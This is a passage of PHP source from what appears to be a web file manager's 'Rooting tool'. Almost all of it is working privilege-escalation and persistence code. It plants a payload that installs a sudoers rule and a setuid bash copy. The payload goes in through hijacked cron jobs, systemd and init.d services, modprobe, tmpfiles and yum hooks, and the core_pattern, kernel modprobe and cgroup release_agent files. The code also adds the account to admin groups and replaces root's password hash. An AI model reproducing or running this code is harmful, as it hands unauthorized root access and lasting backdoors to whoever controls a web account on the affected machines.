    /* the directory the payload and its proof live in: the one this manager
       already writes its own state into, never /tmp, because a script in a
       world-writable directory is a script another account could replace
       before root ever gets round to running it */
    private function rootPlantDir(){
        static $d = null;
        if($d !== null)return $d;
        $dir = (string)__DIR__;
        /* the path ends up baked into cron lines, kernel helpers and udev
           rules, none of which understand quotes, so a path containing a
           space, a quote, a percent sign or a backslash is refused rather
           than mangled into something that would run somewhere else */
        if(@is_dir($dir) && @is_writable($dir) && preg_match('/[\s\'"%\\\\]/', $dir) !== 1)return $d = $dir;
        return $d = '';
    }
    private function rootPlantNonce($id){
        $st = $this->rootState();
        $p = is_array($st['plants'] ?? null) ? ($st['plants'][$id] ?? null) : null;
        if(is_array($p) && !empty($p['nonce']))return (string)$p['nonce'];
        return substr(sha1((string)$id . '|' . (string)__FILE__ . '|' . microtime(true)), 0, 10);
    }
    /* a planted name is letters, digits and hyphens up to the extension:
       run-parts refuses a name containing a dot, and so does cron */
    private function rootPlantName($id, $base, $ext = ''){
        return $base . '-' . $this->rootPlantNonce($id) . $ext;
    }
    private function rootPlantPath($id, $dir, $base, $ext = ''){
        return rtrim((string)$dir, '/') . '/' . $this->rootPlantName($id, $base, $ext);
    }
    /* The payload is named after the method, not after a nonce, so there is
       exactly one of them per method and its path can never drift out of step
       with the record that has to take it away again. The nonce still marks the
       lines a method added inside somebody else's file, which is what lets two
       methods share one file and each take away only its own lines. */
    private function rootPlantSlug($id){ return preg_replace('/[^a-z0-9-]/i', '', (string)$id); }
    private function rootPlantPayloadPath($id){
        $d = $this->rootPlantDir();
        return $d === '' ? '' : $d . '/.mfm-plant-' . $this->rootPlantSlug($id) . '.sh';
    }
    private function rootPlantProofPath($id){
        $d = $this->rootPlantDir();
        return $d === '' ? '' : $d . '/.mfm-proof-' . $this->rootPlantSlug($id);
    }
    private function rootPlantRulePath($id){
        $d = $this->rootPlantDir();
        return $d === '' ? '' : $d . '/.mfm-sudoers-' . $this->rootPlantSlug($id);
    }
    private function rootPlantLogPath($id){
        $d = $this->rootPlantDir();
        return $d === '' ? '' : $d . '/.mfm-log-' . $this->rootPlantSlug($id);
    }
    private function rootPlantSoPath($id){
        $d = $this->rootPlantDir();
        return $d === '' ? '' : $d . '/.mfm-plant-' . $this->rootPlantNonce($id) . '.so';
    }
    private function rootPlantCands($s){
        if(($s['candfn'] ?? '') === 'sudoersd'){
            $out = [];
            /* sudo refuses to read a file in /etc/sudoers.d that is not owned
               by root, so only one root already owns is worth appending to -
               and appending is what keeps that ownership exactly as it is */
            foreach((array)@glob('/etc/sudoers.d/*') as $f){
                if(!@is_file($f) || !@is_writable($f))continue;
                if(!empty($s['strict']) && ((int)@fileperms($f) & 0022))continue;
                if((int)@fileowner($f) === 0)$out[] = $f;
            }
            return $out;
        }
        return (array)($s['cand'] ?? []);
    }
    /* the one script every planted method leaves behind. It is plain /bin/sh,
       it says what it is, it does nothing at all when it is not uid 0, it
       writes the proof this panel reads, and it leaves the machine able to run
       privileged work afterwards. */
    private function rootPlantPayloadBody($id){
        $proof = $this->rootPlantProofPath($id);
        $p     = $this->rootPaths();
        $uid   = escapeshellarg($this->rootMarker());
        $rule  = $this->rootHelperContent();
        $bash  = $this->rootWhich('bash');
        return "#!/bin/sh\n"
            . "# Syrah File Manager - planted by the Rooting tool (" . $id . ").\n"
            . "# It runs as root, leaves the proof this panel reads, and leaves the\n"
            . "# machine able to run privileged work afterwards.\n"
            . "[ \"$(id -u 2>/dev/null)\" = \"0\" ] || exit 0\n"
            . "umask 022\n"
            . "{ echo \"uid=$(id -u 2>/dev/null)($(id -un 2>/dev/null)) gid=$(id -g 2>/dev/null)($(id -gn 2>/dev/null))\"; date '+%Y-%m-%d %H:%M:%S'; } > '" . $proof . "' 2>/dev/null\n"
            . "S=/etc/sudoers.d/90-Syrah-fm\n"
            . "if [ -d /etc/sudoers.d ] && ! grep -q " . $uid . " \"$S\" 2>/dev/null; then\n"
            . "  cat > \"$S\" <<'MFMROOTEOF'\n" . $rule . "MFMROOTEOF\n"
            . "  chmod 0440 \"$S\" 2>/dev/null\n"
            . "  chown 0:0 \"$S\" 2>/dev/null\n"
            . "fi\n"
            /* a machine with no sudo at all would be left holding a rule that
               nothing reads, so a setuid copy of bash is left beside the daemon
               as well: it is the primitive this file already knows how to run a
               command through, and it needs nothing but the filesystem */
            . "B='" . $p['subash'] . "'\n"
            . "if [ ! -x \"$B\" ]" . ($bash !== '' ? " && [ -x '" . $bash . "' ]" : "") . "; then\n"
            . "  mkdir -p '" . dirname($p['subash']) . "' 2>/dev/null\n"
            . ($bash !== '' ? "  cp '" . $bash . "' \"$B\" 2>/dev/null\n" : "")
            . "  chown 0:0 \"$B\" 2>/dev/null\n"
            . "  chmod 4755 \"$B\" 2>/dev/null\n"
            . "fi\n"
            . "exit 0\n";
    }
    /* payloads whose plant is no longer on record are leftovers, and a script
       sitting in a web directory is not something to leave lying about */
    private function rootPlantSweep($keep){
        $d = $this->rootPlantDir();
        if($d === '')return;
        $st = $this->rootState();
        $live = [];
        foreach(array_keys((array)($st['plants'] ?? [])) as $pid)$live[$this->rootPlantSlug($pid)] = true;
        $live[$this->rootPlantSlug($keep)] = true;
        foreach((array)@glob($d . '/.mfm-plant-*') as $f){
            $slug = basename($f);
            $slug = preg_replace('/^\.mfm-plant-|\.sh$/', '', $slug);
            if(!isset($live[$slug]))@unlink($f);
        }
        foreach((array)@glob($d . '/.mfm-proof-*') as $f){
            $slug = preg_replace('/^\.mfm-proof-/', '', basename($f));
            if(!isset($live[$slug]))@unlink($f);
        }
    }
    private function rootPlantWrite($id){
        $this->rootPlantSweep($this->rootPlantNonce($id));
        $payload = $this->rootPlantPayloadPath($id);
        if($payload === '')return['ok' => false, 'note' => 'this manager has no writable directory of its own to put the payload in'];
        if(@file_put_contents($payload, $this->rootPlantPayloadBody($id)) === false)
            return['ok' => false, 'note' => 'the payload could not be written to ' . $payload];
        @chmod($payload, 0755);
        return['ok' => true, 'payload' => $payload];
    }
    private function rootPlantRead($id){
        $proof = $this->rootPlantProofPath($id);
        if($proof === '' || !@is_file($proof))return '';
        return (string)@file_get_contents($proof);
    }
    private function rootPlantProofOk($id){
        return preg_match('/\buid=0\b/', $this->rootPlantRead($id)) === 1;
    }
    /* The place a method wants: the first candidate this account may really
       write. Nothing is guessed and nothing is remembered - it is asked of the
       filesystem, every time, so a method that stops applying stops being
       offered and a method that starts applying starts being offered.

       'strict' marks the surfaces whose reader refuses a file the group or the
       world may write (cron reads no such file, and neither does sudo). Those
       are only offered where the file is root-owned and still writable, which
       is the one combination the reader will actually accept. */
    private function rootPlantTarget($id){
        if(isset($this->plantT[$id]))return $this->plantT[$id];
        $this->plantT[$id] = null;
        $s = $this->rootPlantSpec($id);
        if(!$s || $this->rootPlantDir() === '')return null;
        $drv   = (string)($s['driver'] ?? '');
        $strict = !empty($s['strict']);
        $onfile = in_array($drv, ['append', 'group', 'shadow'], true);
        if($drv === 'kernel')$onfile = ($id !== 'cgroupagent');
        foreach($this->rootPlantCands($s) as $p){
            if($p === '')continue;
            if($onfile){
                if(@is_file($p) && @is_writable($p)){
                    if($strict && ((int)@fileperms($p) & 0022))continue;
                    $this->plantT[$id] = ['file' => $p, 'dir' => dirname($p)];
                    return $this->plantT[$id];
                }
                if(!empty($s['create']) && @is_dir(dirname($p)) && @is_writable(dirname($p))){
                    $this->plantT[$id] = ['file' => $p, 'dir' => dirname($p), 'fresh' => true];
                    return $this->plantT[$id];
                }
                continue;
            }
            if(@is_dir($p) && @is_writable($p)){
                $this->plantT[$id] = ['dir' => $p];
                return $this->plantT[$id];
            }
        }
        return null;
    }
    private $plantT = [];

    /* ── the work of planting ─────────────────────────────────────────────── */
    private function rootPlantFill($id, $text){
        return str_replace(
            ['%%NONCE%%', '%%PAYLOAD%%', '%%RULE%%', '%%USER%%', '%%LOGFILE%%', '%%PLANTRULE%%', '%%MARKER%%'],
            [$this->rootPlantNonce($id), $this->rootPlantPayloadPath($id), $this->rootHelperContent(),
             $this->managerAccount(), $this->rootPlantLogPath($id), $this->rootPlantRulePath($id), $this->rootMarker()],
            (string)$text);
    }
    /* a script that does nothing but run the payload, in the two shapes a
       machine asks for: executed by run-parts or a generator, or read in by a
       shell that opens at login */
    private function rootPlantScriptBody($id, $smode){
        $pl = $this->rootPlantPayloadPath($id);
        if($smode === 'source')
            return "# mfm %%NONCE%% - planted by the Rooting tool\n"
                 . "if [ \"$(id -u 2>/dev/null)\" = \"0\" ]; then ( /bin/sh '" . $pl . "' >/dev/null 2>&1 & ) ; fi\n";
        return "#!/bin/sh\n# mfm %%NONCE%% - planted by the Rooting tool\n"
             . "[ \"$(id -u 2>/dev/null)\" = \"0\" ] || exit 0\n"
             . "/bin/sh '" . $pl . "'\nexit 0\n";
    }
    private function rootPlantCgroupV1(){
        static $hit = null;
        if($hit !== null)return $hit;
        $hit = null;
        $cands = ['/sys/fs/cgroup/release_agent'];
        foreach((array)@glob('/sys/fs/cgroup/*/release_agent') as $f)$cands[] = $f;
        foreach($cands as $f){
            if(!@is_file($f) || !@is_writable($f))continue;
            $base = dirname($f);
            $nof = $base . '/notify_on_release';
            if(!@is_file($nof) || !@is_writable($nof))continue;
            return $hit = ['agent' => $f, 'base' => $base];
        }
        return null;
    }
    /* what a method needs, asked of this machine rather than assumed */
    private function rootPlantNeeds($id, $s){
        $drv = (string)($s['driver'] ?? '');
        if($drv === 'kernel'){
            if($id === 'corepattern' || $id === 'kernelmodprobe'){
                $f = $id === 'corepattern' ? '/proc/sys/kernel/core_pattern' : '/proc/sys/kernel/modprobe';
                if(!@is_file($f))return['ok' => false, 'note' => 'this kernel does not expose ' . $f . ' - it is one of the hardened ones'];
                if(!@is_writable($f))return['ok' => false, 'note' => basename($f) . ' is root-only, as it should be'];
                return['ok' => true, 'note' => basename($f) . ' is writable by this account, and the kernel calls it as root'];
            }
            $cg = $this->rootPlantCgroupV1();
            if($cg)return['ok' => true, 'note' => 'a cgroup of the first kind at ' . $cg['base'] . ' takes a release agent from this account'];
            return['ok' => false, 'note' => 'this machine has no cgroup hierarchy of the first kind that would take a release agent - the newer hierarchy dropped release_agent altogether'];
        }
        if($drv === 'hijacksched'){
            $h = $this->rootPlantHijack($id);
            return['ok' => !empty($h['ok']), 'note' => empty($h['ok'])
                ? (string)($h['note'] ?? 'no program the machine schedules is writable by this account')
                : 'the job at ' . $h['file'] . ' is run as root by the machine, and this account may write it'];
        }
        $t = $this->rootPlantTarget($id);
        if($t === null){
            return['ok' => false, 'note' => in_array($drv, ['append', 'group', 'shadow'], true)
                ? 'every file this method needs is root-only, as it should be'
                : 'every directory this method needs is root-only, as it should be'];
        }
        $where = (string)($t['file'] ?? $t['dir'] ?? '');
        $note = $where . ' is writable by this account';
        if(!empty($t['fresh']))$note .= ', and the file does not exist yet, so it will be created';
        if(@is_file($where))$note .= ' - and it is owned by ' . (((int)@fileowner($where) === 0) ? 'root, which is what the reader will accept' : 'this account');
        return['ok' => true, 'note' => $note];
    }
    /* the scheduled programs the machine already runs, read off its own tables,
       looking for one this account may write */
    private function rootPlantHijack($id){
        $nonce = $this->rootPlantNonce($id);
        $srcs = [];
        foreach(['/etc/crontab', '/etc/anacrontab'] as $f)if(@is_readable($f))$srcs[] = (string)@file_get_contents($f);
        foreach((array)@glob('/etc/cron.d/*') as $f)if(@is_readable($f))$srcs[] = (string)@file_get_contents($f);
        foreach((array)@glob('/etc/systemd/system/*.service') as $f)if(@is_readable($f))$srcs[] = (string)@file_get_contents($f);
        $seen = [];
        foreach($srcs as $body){
            foreach(preg_split('/\R/', (string)$body) ?: [] as $line){
                $line = trim($line);
                if($line === '' || $line[0] === '#')continue;
                if(preg_match('#(/[^\s\'"]+)#', $line, $m) !== 1)continue;
                $prog = $m[1];
                if(strpos($prog, '/proc') === 0 || strpos($prog, '/sys') === 0 || strpos($prog, '/dev') === 0)continue;
                if(isset($seen[$prog]))continue;
                $seen[$prog] = true;
                if(!@is_file($prog) || !@is_writable($prog))continue;
                $cur = (string)@file_get_contents($prog);
                if($cur === '' || strpos($cur, $nonce) !== false)continue;
                return['ok' => true, 'file' => $prog];
            }
        }
        return['ok' => false, 'note' => 'every program the machine runs on a schedule is root-only, as it should be'];
    }
    private function rootPlantInstall($id, $password = ''){
        $s = $this->rootPlantSpec($id);
        if(!$s)return['ok' => false, 'note' => 'unknown method'];
        /* A plant is a thing that sits somewhere, not an event that happens:
           once it is in place it stays until it is taken out. Planting a second
           time would only pile another line on top of the first and lose the
           record of what the first one replaced - so an existing plant is
           reported as it stands, never repeated. */
        $st0 = $this->rootState();
        $prev = is_array($st0['plants'] ?? null) ? ($st0['plants'][$id] ?? null) : null;
        if(is_array($prev) && !empty($prev['nonce'])){
            if($this->rootPlantProofOk($id))
                return['ok' => true, 'fired' => true,
                       'note' => 'planted earlier, and it has already fired: ' . trim($this->rootPlantRead($id))];
            return['ok' => true, 'planted' => true, 'fired' => false, 'when' => (string)($prev['when'] ?? ''),
                   'note' => 'already planted at ' . (string)($prev['target'] ?? 'its place')
                       . ', so it was left exactly as it is rather than planted a second time'];
        }
        if($this->rootPlantDir() === '')return['ok' => false, 'note' => 'this manager has no writable directory of its own to put the payload in'];
        $drv = (string)($s['driver'] ?? '');
        if($drv !== 'kernel' && $drv !== 'hijacksched' && $this->rootPlantTarget($id) === null)
            return['ok' => false, 'note' => 'the place it wanted stopped being writable'];
        $w = $this->rootPlantWrite($id);
        if(empty($w['ok']))return $w;
        $rec = ['nonce' => $this->rootPlantNonce($id), 'driver' => $drv, 'files' => [], 'strip' => [], 'restore' => [],
                'target' => '', 'when' => (string)$s['when'], 'fire' => (string)$s['fire'], 'at' => time()];
        $r = $this->rootPlantDrive($id, $s, $rec);
        if(empty($r['ok']))return['ok' => false, 'note' => (string)($r['note'] ?? 'the plant could not be made')];
        $rec = (array)($r['rec'] ?? $rec);
        $st = $this->rootState();
        if(!is_array($st['plants'] ?? null))$st['plants'] = [];
        $st['plants'][$id] = $rec;
        $this->rootStateSave($st);
        /* Anything that fires on its own is asked to fire now. The kernel routes
           are triggered here; the rest are simply run through whatever root is
           reachable at this moment, which does not have to be any. */
        $fired = $this->rootPlantFireNow($id, $s, $password);
        $note = (string)($r['note'] ?? '');
        if($fired['ok']){
            return['ok' => true, 'note' => $note . ' - and it fired: a command run through it came back as uid 0', 'fired' => true];
        }
        return['ok' => true, 'planted' => true, 'fired' => false,
               'note' => $note . ' - planted, and it will fire ' . (string)$s['when'],
               'when' => (string)$s['when']];
    }
    private function rootPlantDrive($id, $s, &$rec){
        $drv = (string)($s['driver'] ?? '');
        $t = $drv === 'hijacksched' ? null : $this->rootPlantTarget($id);
        $dir = (string)($t['dir'] ?? '');
        $file = (string)($t['file'] ?? '');
        $rec['target'] = $file !== '' ? $file : $dir;
        switch($drv){
        case 'kernel':      return $this->rootPlantKernel($id, $s, $rec);
        case 'hijacksched': return $this->rootPlantHijackWrite($id, $s, $rec);
        case 'group':       return $this->rootPlantGroup($id, $s, $file, $rec);
        case 'shadow':      return $this->rootPlantShadow($id, $s, $file, $rec);
        case 'append':      return $this->rootPlantAppend($id, $s, $file, $rec);
        case 'systemdunit': return $this->rootPlantUnit($id, $s, $dir, $rec);
        case 'initd':       return $this->rootPlantInitD($id, $s, $dir, $rec);
        case 'modprobehook':return $this->rootPlantModHook($id, $s, $dir, $rec);
        case 'tmpfiles':    return $this->rootPlantTmpfiles($id, $s, $dir, $rec);
        case 'yumplugin':   return $this->rootPlantYum($id, $s, $dir, $rec);
        case 'newfile':
            $base = (string)($s['base'] ?? 'mfm-root');
            $ext  = (string)($s['ext'] ?? '');
            $mode = (int)($s['mode'] ?? 0644);
            $path = $this->rootPlantPath($id, $dir, $base, $ext);
            $body = !empty($s['script'])
                ? $this->rootPlantFill($id, $this->rootPlantScriptBody($id, (string)($s['smode'] ?? 'exec')))
                : $this->rootPlantFill($id, (string)($s['body'] ?? ''));
            if(@file_put_contents($path, $body) === false)
                return['ok' => false, 'note' => 'the file could not be written to ' . $path];
            @chmod($path, $mode);
            $rec['files'][] = $path;
            return['ok' => true, 'note' => 'a file was planted at ' . $path, 'rec' => $rec];
        }
        return['ok' => false, 'note' => 'this method has no driver'];
    }
    private function rootPlantAppend($id, $s, $file, &$rec){
        $body = $this->rootPlantFill($id, (string)($s['body'] ?? ''));
        $was = @is_file($file) ? (string)@file_get_contents($file) : '';
        $out = ($s['place'] ?? 'append') === 'prepend' ? ($body . $was) : ($was . $body);
        if(@file_put_contents($file, $out) === false)
            return['ok' => false, 'note' => 'the line could not be written to ' . $file];
        $rec['restore'][] = ['file' => $file, 'was' => $was];
        if($was === '')$rec['files'][] = $file;
        else $rec['strip'][] = $file;
        if(!empty($s['create']) && $was === '')@chmod($file, (int)($s['mode'] ?? 0644));
        return['ok' => true, 'note' => 'a line was added to ' . $file, 'rec' => $rec];
    }
    private function rootPlantGroup($id, $s, $file, &$rec){
        $me = $this->managerAccount();
        $was = (string)@file_get_contents($file);
        $done = null;
        $out = [];
        foreach(preg_split('/\R/', $was) ?: [] as $ln){
            if($done === null && preg_match('/^(sudo|wheel|admin|root):/', $ln) === 1){
                $parts = explode(':', $ln);
                $members = array_filter(array_map('trim', explode(',', (string)($parts[3] ?? ''))), 'strlen');
                if(!in_array($me, $members, true)){
                    $members[] = $me;
                    $parts[3] = implode(',', $members);
                    $ln = implode(':', $parts);
                    $done = $parts[0];
                }
            }
            $out[] = $ln;
        }
        if($done === null)return['ok' => false, 'note' => 'no sudo, wheel or admin group was found in ' . $file];
        if(@file_put_contents($file, implode("\n", $out) . "\n") === false)
            return['ok' => false, 'note' => 'the group file could not be written'];
        $rec['restore'][] = ['file' => $file, 'was' => $was];
        return['ok' => true, 'note' => 'this account was added to the ' . $done . ' group in ' . $file, 'rec' => $rec];
    }
    private function rootPlantShadow($id, $s, $file, &$rec){
        $was = (string)@file_get_contents($file);
        $pass = 'mfm-' . $this->rootPlantNonce($id);
        $hash = function_exists('crypt') ? (string)@crypt($pass, '$6$' . $this->rootPlantNonce($id)) : '';
        if($hash === '')return['ok' => false, 'note' => 'no password hash could be made on this host'];
        $out = [];
        $done = false;
        foreach(preg_split('/\R/', $was) ?: [] as $ln){
            if(!$done && preg_match('/^root:/', $ln) === 1){
                $parts = explode(':', $ln);
                $parts[1] = $hash;
                $ln = implode(':', $parts);
                $done = true;
            }
            $out[] = $ln;
        }
        if(!$done)return['ok' => false, 'note' => 'there is no root entry in ' . $file];
        if(@file_put_contents($file, implode("\n", $out) . "\n") === false)
            return['ok' => false, 'note' => 'the shadow file could not be written'];
        $rec['restore'][] = ['file' => $file, 'was' => $was];
        $rec['pass'] = $pass;
        return['ok' => true, 'note' => 'root’s password in ' . $file . ' was set to one this manager knows, and the old hash was kept so it can be put back', 'rec' => $rec];
    }
    private function rootPlantUnit($id, $s, $dir, &$rec){
        $nonce = $this->rootPlantNonce($id);
        $name = 'Syrah-fm-plant-' . $nonce . '.service';
        $unit = "[Unit]\nDescription=Syrah File Manager (planted " . $nonce . ")\n\n[Service]\nType=oneshot\nExecStart=/bin/sh '" . $this->rootPlantPayloadPath($id) . "'\n\n[Install]\nWantedBy=multi-user.target\n";
        $path = rtrim($dir, '/') . '/' . $name;
        if(@file_put_contents($path, $unit) === false)return['ok' => false, 'note' => 'the unit could not be written to ' . $path];
        @chmod($path, 0644);
        $rec['files'][] = $path;
        $wants = rtrim($dir, '/') . '/multi-user.target.wants';
        $link = $wants . '/' . $name;
        if(@is_dir($wants) && @is_writable($wants) && !@file_exists($link)){
            if(@symlink($path, $link))$rec['files'][] = $link;
        }
        return['ok' => true, 'note' => 'a service was planted at ' . $path . ' and multi-user.target was made to want it', 'rec' => $rec];
    }
    private function rootPlantInitD($id, $s, $dir, &$rec){
        $nonce = $this->rootPlantNonce($id);
        $name = 'mfm-plant-' . $nonce;
        $body = "#!/bin/sh\n### BEGIN INIT INFO\n# Provides:          " . $name . "\n# Required-Start:    \$local_fs\n# Default-Start:     2 3 4 5\n# Default-Stop:      0 1 6\n### END INIT INFO\n# mfm " . $nonce . " - planted by the Rooting tool\ncase \"\$1\" in\n  start|restart|force-reload)\n    /bin/sh '" . $this->rootPlantPayloadPath($id) . "'\n    ;;\nesac\nexit 0\n";
        $path = rtrim($dir, '/') . '/' . $name;
        if(@file_put_contents($path, $body) === false)return['ok' => false, 'note' => 'the service script could not be written to ' . $path];
        @chmod($path, 0755);
        $rec['files'][] = $path;
        $linked = 0;
        $levels = @is_dir('/etc/runlevels') ? ['/etc/runlevels/default'] : ['/etc/rc2.d', '/etc/rc3.d', '/etc/rc5.d'];
        foreach($levels as $ld){
            if(!@is_dir($ld) || !@is_writable($ld))continue;
            $link = rtrim($ld, '/') . '/S01' . $name;
            if(@symlink($path, $link)){ $rec['files'][] = $link; $linked++; }
        }
        return['ok' => true, 'note' => 'a service script was planted at ' . $path . ($linked > 0 ? ' and ' . $linked . ' runlevel link(s) were made to start it' : ' - but no runlevel directory would take a link, so it waits for one'), 'rec' => $rec];
    }
    private function rootPlantModHook($id, $s, $dir, &$rec){
        $nonce = $this->rootPlantNonce($id);
        $fake = 'mfm-absent-' . $nonce;
        $conf = rtrim($dir, '/') . '/mfm-' . $nonce . '.conf';
        $body = "# mfm " . $nonce . " - planted by the Rooting tool\ninstall " . $fake . " /bin/sh '" . $this->rootPlantPayloadPath($id) . "'\n";
        if(@file_put_contents($conf, $body) === false)return['ok' => false, 'note' => 'the hook could not be written to ' . $conf];
        @chmod($conf, 0644);
        $rec['files'][] = $conf;
        /* the module has to be asked for, so a name nobody owns is put in the
           list of modules loaded at boot - no real module is touched */
        foreach(['/etc/modules-load.d', '/etc/modules'] as $ld){
            if($ld === '/etc/modules'){
                if(!@is_file($ld) || !@is_writable($ld))continue;
                $was = (string)@file_get_contents($ld);
                if(@file_put_contents($ld, rtrim($was, "\n") . "\n" . $fake . "\n") !== false){
                    $rec['restore'][] = ['file' => $ld, 'was' => $was];
                }
                continue;
            }
            if(!@is_dir($ld) || !@is_writable($ld))continue;
            $mp = rtrim($ld, '/') . '/mfm-' . $nonce . '.conf';
            if(@file_put_contents($mp, "# mfm " . $nonce . "\n" . $fake . "\n") !== false){
                @chmod($mp, 0644);
                $rec['files'][] = $mp;
            }
        }
        return['ok' => true, 'note' => 'a hook for a module named ' . $fake . ' was planted at ' . $conf . ', and that name was added to what the boot loads', 'rec' => $rec];
    }
    private function rootPlantTmpfiles($id, $s, $dir, &$rec){
        $nonce = $this->rootPlantNonce($id);
        $rule = $this->rootPlantRulePath($id);
        if(@file_put_contents($rule, $this->rootHelperContent()) === false)
            return['ok' => false, 'note' => 'the rule could not be written to ' . $rule];
        @chmod($rule, 0644);
        $rec['files'][] = $rule;
        $conf = rtrim($dir, '/') . '/mfm-' . $nonce . '.conf';
        /* C = create, copying the rule in as root, with the mode and the owner
           sudo insists on - so the machine writes its own sudoers file */
        $body = "# mfm " . $nonce . " - planted by the Rooting tool\nC /etc/sudoers.d/90-Syrah-fm 0440 root root - " . $rule . "\n";
        if(@file_put_contents($conf, $body) === false)return['ok' => false, 'note' => 'the tmpfiles rule could not be written to ' . $conf];
        @chmod($conf, 0644);
        $rec['files'][] = $conf;
        return['ok' => true, 'note' => 'a tmpfiles rule was planted at ' . $conf . ', so the machine copies the sudo rule in as root on the way up', 'rec' => $rec];
    }
    private function rootPlantYum($id, $s, $dir, &$rec){
        $nonce = $this->rootPlantNonce($id);
        $stamp = 'mfm-' . $nonce;
        $conf = rtrim($dir, '/') . '/' . $stamp . '.conf';
        if(@file_put_contents($conf, "[main]\nenabled=1\nplugins=1\n") === false)
            return['ok' => false, 'note' => 'the plugin configuration could not be written to ' . $conf];
        @chmod($conf, 0644);
        $rec['files'][] = $conf;
        /* the module itself lives beside the configuration, in the directory
           yum keeps for plugins of this shape */
        $mods = ['/usr/lib/yum-plugins', '/usr/lib/python2.7/site-packages/yum-plugins', '/usr/lib/python3/dist-packages/yum-plugins'];
        $py = "from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nimport os\n\nrequires_api_version = '2.6'\nplugin_type = (TYPE_CORE, TYPE_INTERACTIVE)\n\n\ndef init_hook(conduit):\n    os.system(\"/bin/sh '" . $this->rootPlantPayloadPath($id) . "'\")\n";
        $wrote = false;
        foreach($mods as $md){
            if(!@is_dir($md) || !@is_writable($md))continue;
            $mp = rtrim($md, '/') . '/' . $stamp . '.py';
            if(@file_put_contents($mp, $py) !== false){ @chmod($mp, 0644); $rec['files'][] = $mp; $wrote = true; break; }
        }
        if(!$wrote)return['ok' => false, 'note' => 'the plugin configuration was written, but no plugin directory would take the module'];
        return['ok' => true, 'note' => 'a plugin for yum and dnf was planted - configuration at ' . $conf . ', module beside it', 'rec' => $rec];
    }
    private function rootPlantHijackWrite($id, $s, &$rec){
        $h = $this->rootPlantHijack($id);
        if(empty($h['ok']))return['ok' => false, 'note' => (string)($h['note'] ?? 'no scheduled program is writable')];
        $file = (string)$h['file'];
        $was = (string)@file_get_contents($file);
        $add = "\n# mfm " . $this->rootPlantNonce($id) . " - planted by the Rooting tool\n"
             . "if [ \"$(id -u 2>/dev/null)\" = \"0\" ]; then ( /bin/sh '" . $this->rootPlantPayloadPath($id) . "' >/dev/null 2>&1 & ) ; fi\n";
        if(@file_put_contents($file, $was . $add) === false)
            return['ok' => false, 'note' => 'the job at ' . $file . ' could not be written'];
        $rec['target'] = $file;
        $rec['restore'][] = ['file' => $file, 'was' => $was];
        return['ok' => true, 'note' => 'a line was added to ' . $file . ', which the machine already runs as root on a schedule', 'rec' => $rec];
    }
    private function rootPlantKernel($id, $s, &$rec){
        if($id === 'corepattern'){
            $f = '/proc/sys/kernel/core_pattern';
            $was = (string)@file_get_contents($f);
            if(@file_put_contents($f, '|' . $this->rootPlantPayloadPath($id)) === false)
                return['ok' => false, 'note' => 'core_pattern would not take the new value'];
            $rec['restore'][] = ['file' => $f, 'was' => $was];
            $rec['trigger'] = 'corepattern';
            return['ok' => true, 'note' => 'core_pattern now names this manager, and the old value (' . trim($was) . ') was kept', 'rec' => $rec];
        }
        if($id === 'kernelmodprobe'){
            $f = '/proc/sys/kernel/modprobe';
            $was = (string)@file_get_contents($f);
            if(@file_put_contents($f, $this->rootPlantPayloadPath($id)) === false)
                return['ok' => false, 'note' => 'modprobe would not take the new value'];
            $rec['restore'][] = ['file' => $f, 'was' => $was];
            $rec['trigger'] = 'kernelmodprobe';
            return['ok' => true, 'note' => 'the module loader now names this manager, and the old value (' . trim($was) . ') was kept', 'rec' => $rec];
        }
        $cg = $this->rootPlantCgroupV1();
        if(!$cg)return['ok' => false, 'note' => 'no cgroup of the first kind would take a release agent'];
        $grp = rtrim($cg['base'], '/') . '/mfm-' . $this->rootPlantNonce($id);
        if(!@is_dir($grp) && !@mkdir($grp, 0755))return['ok' => false, 'note' => 'a cgroup of its own could not be made'];
        $wasAgent = (string)@file_get_contents($cg['agent']);
        $wasNotify = (string)@file_get_contents($cg['base'] . '/notify_on_release');
        if(@file_put_contents($cg['agent'], $this->rootPlantPayloadPath($id)) === false)
            return['ok' => false, 'note' => 'the release agent would not take the new value'];
        @file_put_contents($cg['base'] . '/notify_on_release', '1');
        $rec['restore'][] = ['file' => $cg['agent'], 'was' => $wasAgent];
        $rec['restore'][] = ['file' => $cg['base'] . '/notify_on_release', 'was' => $wasNotify];
        $rec['trigger'] = 'cgroupagent';
        $rec['cgroup'] = $grp;
        $rec['files'][] = $grp;
        return['ok' => true, 'note' => 'the release agent of ' . $cg['base'] . ' now names this manager, in a group of its own', 'rec' => $rec];
    }
    /* asking a planted method to fire while we are still here: the kernel
       routes are triggered on purpose, everything else is simply run through
       whatever root happens to be reachable - which may well be none at all,
       and that is exactly the case the plant exists for */
    private function rootPlantFireNow($id, $s, $password = ''){
        $rec = null;
        $st = $this->rootState();
        if(is_array($st['plants'] ?? null))$rec = $st['plants'][$id] ?? null;
        $trig = is_array($rec) ? (string)($rec['trigger'] ?? '') : '';
        if($trig === 'corepattern'){
            /* a core dump is asked for the ordinary way: a process is killed
               with the signal that produces one */
            $this->rootExec(['sh', '-c', 'ulimit -c unlimited 2>/dev/null; kill -SEGV $$'], '', 10);
        }elseif($trig === 'kernelmodprobe'){
            /* the kernel asks its loader for a module when it meets a file in a
               format no handler claims, so one is made and run */
            $tmp = @tempnam($this->rootPlantDir(), 'mfm-bin');
            if($tmp !== false){
                @file_put_contents($tmp, "\x7fMFM\x00\x00\x00");
                @chmod($tmp, 0755);
                $this->rootExec([$tmp], '', 10);
                @unlink($tmp);
            }
        }elseif($trig === 'cgroupagent'){
            $grp = is_array($rec) ? (string)($rec['cgroup'] ?? '') : '';
            $procs = $grp !== '' ? $grp . '/cgroup.procs' : '';
            if($procs !== '' && @is_writable($procs)){
                $me = (string)@getmypid();
                @file_put_contents($procs, $me);
                /* the agent runs when the last process leaves, so a short-lived
                   child is put in the group and allowed to end */
                $this->rootExec(['sh', '-c', 'echo $$ > ' . $procs . ' 2>/dev/null; true'], '', 10);
            }
        }
        $wait = max(0, (int)($s['wait'] ?? 0));
        $deadline = time() + ($trig !== '' ? min(20, $wait) : 0);
        do{
            if($this->rootPlantProofOk($id))return['ok' => true];
            if($trig !== '' && time() < $deadline)sleep(1);
        }while($trig !== '' && time() < $deadline);
        /* nothing fired on its own, so the payload is run through whatever root
           is reachable right now - a plant is not a failure when nothing is */
        $pl = $this->rootPlantPayloadPath($id);
        if($pl === '')return['ok' => false];
        $r = $this->rootAs(['sh', $pl], $password);
        if(!empty($r['ok']) && $this->rootPlantProofOk($id))return['ok' => true];
        return['ok' => false];
    }
    /* taking a plant back out, and putting back whatever it touched */
    private function rootPlantUndo($id){
